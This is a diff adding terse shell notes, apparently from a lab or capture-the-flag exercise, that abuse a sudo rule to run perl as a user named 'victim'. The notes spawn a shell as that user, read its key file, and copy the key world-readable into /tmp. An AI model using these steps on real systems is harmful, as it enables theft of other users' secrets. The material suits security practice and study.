@@ -1,0 +1,12 @@
+sudo -u victim perl -e 'print `/home/victim/key.txt`'
+  Key
+  
+sudo -u victim perl -e "print `/home/victim/key.txt`"
+  -bash: /home/victim/key.txt: Permission denied
+  
+==>>>>> sudo -u victim perl -e '`/bin/bash`'
+
+cp /home/victim/key.txt /tmp/.key
+chmod 777 /tmp/.key
+exit
+cat /tmp/.key
